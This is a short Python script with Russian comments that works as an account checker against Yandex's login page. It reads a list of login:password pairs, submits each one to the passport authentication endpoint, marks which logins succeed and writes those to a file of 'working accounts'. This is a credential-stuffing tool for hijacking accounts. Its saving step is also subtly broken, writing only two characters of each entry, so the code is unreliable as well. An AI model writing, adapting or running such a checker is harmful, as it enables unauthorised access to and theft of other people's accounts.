import requests


# -----Чтение файла-----
with open('AccsForCheck.txt', 'r') as file:
	data = file.readlines()

# -----Обработка данных-----
data = [line.rstrip() for line in data]
data = [line.split(':') for line in data]

# -----Чекер-----
work_acc = list()
def check(log: str, pas: str) -> None:
	with requests.Session() as sess:
		response = sess.post('https://passport.yandex.by/auth', {
		     'login': log,
		     'passwd': pas,
		}).text

	if 'data-page-type="auth.enter"' in response:
		print(log + ':' + pas + ' - нерабочий')
	else:
		print(log + ':' + pas + ' - рабочий')
		work_acc.append(log + ':' + pas)

print(data)
# -----Запуск-----
for acc in data:
	check(acc[0], acc[1])

# -----Сохранение-----
with open('WorkAccs.txt', 'w') as file:
	for acc in work_acc:
		acc = acc[0] + ':' + acc[1]
		file.write(acc + '\n')
